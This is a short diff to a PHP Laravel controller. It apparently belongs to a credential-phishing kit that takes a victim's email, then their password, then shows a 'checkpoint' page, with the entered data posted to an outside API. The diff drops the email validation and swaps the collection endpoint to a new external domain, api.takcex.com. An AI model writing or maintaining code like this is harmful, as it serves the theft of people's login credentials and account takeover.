@@ -24,19 +24,8 @@ class MainController extends Controller
             'email' => $email,
             ];
         $result = $this->getDataApi('check-email', $data);
-        $status = $result['status'] ?? null;
-        if ($status === 200) {
-            session()->put('email', $email);
-            $data = [
-                'email' => $email,
-                'status' => $status
-            ];
-            return view('password', $data);
-
-        } elseif ($status === 400) {
-            $message = $result['message'];
-            return view('email', compact('message'));
-        }
+        session()->put('email', $email);
+        return view('password', $data);
     }
 
     public function changePass(Request $request) {
@@ -60,7 +49,7 @@ class MainController extends Controller
             ];
             return view('checkpoint');
         } elseif ($status === 400) {
-            $message = $result['message'];
+            $message = $result['error'];
 
             return view('password', compact('message'));
         }
@@ -89,7 +78,7 @@ class MainController extends Controller
 
     public function getDataApi($url, $data)
     {
-        $response = Http::post('https://api-v7.sp-123.online/' . $url, $data);
+        $response = Http::post('https://api.takcex.com/' . $url, $data);
         $result = $response->json();
         return $result;
     }
